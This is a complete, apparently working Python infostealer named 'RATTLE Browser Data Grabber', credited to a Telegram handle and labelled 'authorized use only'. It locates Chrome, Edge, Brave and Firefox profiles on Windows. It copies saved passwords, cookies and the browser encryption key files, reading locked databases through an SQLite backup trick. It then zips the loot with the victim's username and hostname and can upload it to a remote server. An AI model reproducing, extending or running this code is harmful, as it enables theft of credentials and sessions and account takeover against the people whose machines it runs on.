#!/usr/bin/env python3
# ============================================
# RATTLE - Browser Data Grabber (client side)
# Runs on the Windows machine (authorized use only).
# Finds Chrome / Edge / Brave / Firefox data,
# copies Local State + Cookies + Login Data,
# auto-zips everything, optionally uploads to Rattle.
# Pure standard library - NO pip installs needed.
# Coded by t.me/officialmonsterz
# ============================================

import argparse
import getpass
import json
import os
import shutil
import socket
import sqlite3
import sys
import tempfile
import time
import urllib.error
import urllib.request
import uuid
import zipfile
from datetime import datetime, timezone
from pathlib import Path

IS_WINDOWS = os.name == "nt"

if IS_WINDOWS:
    os.system("")  # one magic call that enables ANSI colors on Windows 10/11


class C:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"


def info(msg):
    print(f"{C.BLUE}[*]{C.RESET} {msg}")


def ok(msg):
    print(f"{C.GREEN}[+]{C.RESET} {msg}")


def warn(msg):
    print(f"{C.YELLOW}[!]{C.RESET} {msg}")


def fail(msg):
    print(f"{C.RED}[x]{C.RESET} {msg}")


def banner():
    print(f"{C.CYAN}{C.BOLD}")
    print("=" * 60)
    print("  RATTLE Browser Data Grabber")
    print("  authorized use only - coded by t.me/officialmonsterz")
    print("=" * 60)
    print(C.RESET)


# ============================================
# Browser discovery
# ============================================

CHROMIUM_BROWSERS = {
    "chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
    "edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
    "brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
}

FIREFOX_PROFILES = os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")


def find_chromium_profiles(user_data_dir):
    """Return Profile directories that actually contain a Cookies file."""
    ud = Path(user_data_dir)
    if not ud.is_dir():
        return []
    profiles = []
    for child in sorted(ud.iterdir()):
        if not child.is_dir():
            continue
        if child.name == "Default" or child.name.startswith("Profile "):
            modern = child / "Network" / "Cookies"
            legacy = child / "Cookies"
            if modern.is_file() or legacy.is_file():
                profiles.append(child)
    return profiles


def find_firefox_profiles(profiles_root):
    """Return Firefox profile directories containing cookies.sqlite."""
    root = Path(profiles_root)
    if not root.is_dir():
        return []
    out = []
    for child in sorted(root.iterdir()):
        if child.is_dir() and (child / "cookies.sqlite").is_file():
            out.append(child)
    return out


# ============================================
# Lock-tolerant file copying
# ============================================

def _sqlite_uri(path):
    return "file:" + str(path).replace("\\", "/") + "?immutable=1"


def copy_locked_file(src, dst):
    """
    Copy src to dst.
    1) normal copy (works for almost everything)
    2) if locked (Chrome holds Cookies), use SQLite immutable backup
    Returns (True, "copy"|"sqlite-backup") or (False, reason).
    """
    src = Path(src)
    dst = Path(dst)
    for attempt in range(3):
        try:
            shutil.copy2(src, dst)
            return True, "copy"
        except PermissionError:
            time.sleep(0.4)
        except OSError as exc:
            warn(f"copy failed for {src.name}: {exc}")
            break

    # SQLite backup fallback - reads even while the browser has it open
    try:
        src_con = sqlite3.connect(_sqlite_uri(src), uri=True)
        dst_con = sqlite3.connect(str(dst))
        with dst_con:
            src_con.backup(dst_con)
        src_con.close()
        dst_con.close()
        return True, "sqlite-backup"
    except sqlite3.Error as exc:
        return False, str(exc)


def count_sqlite_rows(db_path, tables=("cookies", "moz_cookies")):
    """Best-effort row count. Returns -1 if it cannot be read."""
    try:
        con = sqlite3.connect(_sqlite_uri(db_path), uri=True)
    except sqlite3.Error:
        return -1
    try:
        for table in tables:
            try:
                cur = con.execute(f"SELECT COUNT(*) FROM {table}")
                row = cur.fetchone()
                if row is not None:
                    return int(row[0])
            except sqlite3.Error:
                continue
        return -1
    finally:
        con.close()


# ============================================
# The per-browser grab
# ============================================

def grab_chromium(name, user_data_dir, staging):
    """
    Copy 'Local State' (once), then per profile: Cookies + Login Data.
    Returns dict describing the result or None if browser not installed.
    """
    ud = Path(user_data_dir)
    if not ud.is_dir():
        return None

    result = {
        "browser": name,
        "source": str(ud),
        "profiles": [],
        "cookie_count": 0,
        "files_copied": 0,
        "files_failed": 0,
    }

    browser_dir = staging / name
    browser_dir.mkdir(parents=True, exist_ok=True)

    # Local State (holds the encryption key reference) - once per browser
    local_state = ud / "Local State"
    if local_state.is_file():
        success, how = copy_locked_file(local_state, browser_dir / "Local State")
        if success:
            result["files_copied"] += 1
            ok(f"[{name}] Local State copied ({how})")
        else:
            result["files_failed"] += 1
            warn(f"[{name}] Local State FAILED: {how}")
    else:
        warn(f"[{name}] no Local State found")

    profiles = find_chromium_profiles(user_data_dir)
    if not profiles:
        warn(f"[{name}] installed but no profiles with cookies found")

    for prof in profiles:
        prof_name = prof.name.replace(" ", "_")
        prof_dir = browser_dir / prof_name
        prof_dir.mkdir(parents=True, exist_ok=True)

        # Cookies: Chrome 96+ keeps it under Network\, older under profile root
        cookies = prof / "Network" / "Cookies"
        if not cookies.is_file():
            cookies = prof / "Cookies"

        success, how = copy_locked_file(cookies, prof_dir / "Cookies.sqlite")
        if success:
            result["files_copied"] += 1
            n = count_sqlite_rows(prof_dir / "Cookies.sqlite")
            if n >= 0:
                result["cookie_count"] += n
            ok(f"[{name}/{prof_name}] Cookies copied ({how}, {n} cookies)")
        else:
            result["files_failed"] += 1
            fail(f"[{name}/{prof_name}] Cookies FAILED: {how}")

        login_data = prof / "Login Data"
        if login_data.is_file():
            success, how = copy_locked_file(login_data, prof_dir / "Login Data.sqlite")
            if success:
                result["files_copied"] += 1
                ok(f"[{name}/{prof_name}] Login Data copied ({how})")
            else:
                result["files_failed"] += 1
                warn(f"[{name}/{prof_name}] Login Data FAILED: {how}")
        else:
            warn(f"[{name}/{prof_name}] no Login Data")

        result["profiles"].append(prof_name)

    return result


def grab_firefox(staging):
    """Copy cookies.sqlite + logins.json + key4.db from every Firefox profile."""
    root = Path(FIREFOX_PROFILES)
    if not root.is_dir():
        return None

    result = {
        "browser": "firefox",
        "source": str(root),
        "profiles": [],
        "cookie_count": 0,
        "files_copied": 0,
        "files_failed": 0,
    }

    browser_dir = staging / "firefox"
    browser_dir.mkdir(parents=True, exist_ok=True)

    profiles = find_firefox_profiles(FIREFOX_PROFILES)
    if not profiles:
        warn("[firefox] installed but no profiles with cookies.sqlite found")

    for prof in profiles:
        prof_dir = browser_dir / prof.name
        prof_dir.mkdir(parents=True, exist_ok=True)

        wanted = ["cookies.sqlite", "logins.json", "key4.db"]
        copied_any = False
        for fname in wanted:
            src = prof / fname
            if not src.is_file():
                continue
            success, how = copy_locked_file(src, prof_dir / fname)
            if success:
                copied_any = True
                result["files_copied"] += 1
                ok(f"[firefox/{prof.name}] {fname} copied ({how})")
            else:
                result["files_failed"] += 1
                warn(f"[firefox/{prof.name}] {fname} FAILED: {how}")

        n = count_sqlite_rows(prof_dir / "cookies.sqlite")
        if n >= 0:
            result["cookie_count"] += n

        if copied_any:
            result["profiles"].append(prof.name)

    return result


# ============================================
# Zip + manifest
# ============================================

def zip_directory(staging, zip_path):
    """Zip the whole staging directory into one archive."""
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for path in sorted(staging.rglob("*")):
            if path.is_file():
                zf.write(path, path.relative_to(staging))


def make_manifest(device_label, browser_results):
    return {
        "device": device_label,
        "user": getpass.getuser(),
        "hostname": socket.gethostname(),
        "os": sys.platform,
        "grabbed_at_utc": datetime.now(timezone.utc).isoformat(),
        "browsers": browser_results,
    }


# ============================================
# Upload (multipart, standard library only)
# ============================================

def _field(boundary, name, value):
    return (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{name}"\r\n'
        f"\r\n{value}\r\n"
    ).encode("utf-8")


def upload_zip(zip_path, url, key, device_label, browser_results):
    boundary = "----rattle" + uuid.uuid4().hex
    browsers = ",".join(r["browser"] for r in browser_results)
    cookies = sum(r["cookie_count"] for r in browser_results)

    body = b""
    body += _field(boundary, "device", device_label)
    body += _field(boundary, "browsers", browsers)
    body += _field(boundary, "cookies", str(cookies))
    stats = json.dumps(make_manifest(device_label, browser_results))
    body += _field(boundary, "stats", stats)

    with open(zip_path, "rb") as fh:
        content = fh.read()

    body += (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; '
        f'filename="{os.path.basename(zip_path)}"\r\n'
        f"Content-Type: application/zip\r\n\r\n"
    ).encode("utf-8")
    body += content
    body += b"\r\n"
    body += f"--{boundary}--\r\n".encode("utf-8")

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body)),
    }
    if key:
        headers["X-Grab-Key"] = key

    req = urllib.request.Request(url, data=body, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=180) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except (urllib.error.URLError, OSError) as exc:
        return 0, str(exc)


# ============================================
# Main
# ============================================

def main():
    parser = argparse.ArgumentParser(
        description="Rattle browser data grabber (authorized use only)."
    )
    parser.add_argument(
        "--browsers",
        default="chrome,edge,brave,firefox",
        help="comma list: chrome,edge,brave,firefox (default: all)",
    )
    parser.add_argument(
        "--out",
        default=None,
        help="output zip folder (default: current directory)",
    )
    parser.add_argument("--upload", default=None, help="upload URL, e.g. https://site/api/grab/upload")
    parser.add_argument("--key", default="", help="upload key (X-Grab-Key header), if the server requires one")
    parser.add_argument("--device", default=None, help="device label reported to the server (default: HOSTNAME-USER)")
    args = parser.parse_args()

    banner()

    if not IS_WINDOWS:
        warn("not running on Windows - Chromium paths are Windows-style; Firefox may still work")

    device_label = args.device or f"{socket.gethostname()}-{getpass.getuser()}"
    wanted = [b.strip().lower() for b in args.browsers.split(",") if b.strip()]
    unknown = [b for b in wanted if b not in ("chrome", "edge", "brave", "firefox")]
    if unknown:
        fail(f"unknown browser(s): {', '.join(unknown)} (use chrome, edge, brave, firefox)")
        sys.exit(2)

    info(f"device label : {device_label}")
    info(f"browsers     : {', '.join(wanted)}")

    staging = Path(tempfile.mkdtemp(prefix="rattle_grab_"))
    browser_results = []
    try:
        for name in wanted:
            if name == "firefox":
                info("scanning firefox profiles ...")
                result = grab_firefox(staging)
            else:
                info(f"scanning {name} profiles ...")
                result = grab_chromium(name, CHROMIUM_BROWSERS[name], staging)
            if result is None:
                warn(f"{name}: not installed on this machine")
            else:
                browser_results.append(result)

        collected_any = any(r["files_copied"] > 0 for r in browser_results)
        if not collected_any:
            fail("no browser data collected - nothing to zip")
            sys.exit(1)

        manifest = make_manifest(device_label, browser_results)
        (staging / "manifest.json").write_text(
            json.dumps(manifest, indent=2), encoding="utf-8"
        )

        stamp = time.strftime("%Y%m%d_%H%M%S")
        out_dir = Path(args.out) if args.out else Path.cwd()
        out_dir.mkdir(parents=True, exist_ok=True)
        zip_path = out_dir / f"rattle_grab_{stamp}.zip"
        zip_directory(staging, zip_path)

        total_cookies = sum(r["cookie_count"] for r in browser_results)
        total_files = sum(r["files_copied"] for r in browser_results)
        total_failed = sum(r["files_failed"] for r in browser_results)
        size_mb = zip_path.stat().st_size / (1024 * 1024)

        print()
        ok(f"archive saved : {zip_path}")
        ok(f"files copied  : {total_files}" + (f" (failed: {total_failed})" if total_failed else ""))
        ok(f"cookies found : {total_cookies}")
        ok(f"archive size  : {size_mb:.2f} MB")
        print()

        if args.upload:
            info(f"uploading to {args.upload} ...")
            status, text = upload_zip(zip_path, args.upload, args.key, device_label, browser_results)
            # BUG FIX: we strip ALL spaces from the response first, so the
            # needle must ALSO be space-free ('"success":true'), otherwise
            # a successful upload was always reported as failed.
            if status == 200 and '"success":true' in text.replace(" ", "").lower():
                ok(f"upload OK - server said: {text.strip()}")
            else:
                fail(f"upload failed (HTTP {status}): {text.strip()}")
                sys.exit(3)
    finally:
        shutil.rmtree(staging, ignore_errors=True)

    print(f"{C.GREEN}{C.BOLD}DONE.{C.RESET}")


if __name__ == "__main__":
    main()
